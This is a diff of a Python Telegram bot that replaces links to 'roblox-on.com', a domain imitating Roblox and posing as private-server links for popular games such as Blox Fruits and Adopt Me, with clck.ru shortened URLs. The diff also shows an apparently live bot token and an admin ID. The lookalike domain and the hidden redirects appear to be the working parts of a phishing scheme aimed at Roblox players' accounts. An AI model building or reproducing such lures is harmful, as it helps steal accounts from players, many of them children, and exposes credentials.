@@ -10,11 +10,11 @@ bot = telebot.TeleBot('5835653943:AAGq16iK21oT-4J-bI9xiVg84DExVLL_Wp0')
 
 
 
-fruit = 'https://roblox-on.com/games/2753915549/Blox-Fruits?privateServerLinkCode=55512589441441423710300362201733'
-mm2 = 'https://roblox-on.com/games/142823291/Murder-Mystery-2?privateServerLinkCode=55512589441441423710300362201733'
-adopt = 'https://roblox-on.com/games/920587237/Adopt-Me?privateServerLinkCode=55512589441441423710300362201733'
-plsdonate = 'https://roblox-on.com/games/8737602449/PLS-DONATE?privateServerLinkCode=55512589441441423710300362201733'
-psx = 'https://roblox-on.com/games/6284583030/Pet-Simulator-X?privateServerLinkCode=55512589441441423710300362201733'
+fruit = 'https://clck.ru/35FXro'
+mm2 = 'https://clck.ru/35FXrn'
+adopt = 'https://clck.ru/35FXrq'
+plsdonate = 'https://clck.ru/35FXrt'
+psx = 'https://clck.ru/35FXrp'
 helpos = 'https://clicks.su/G60EeY'
 
 admin = '1123693953'
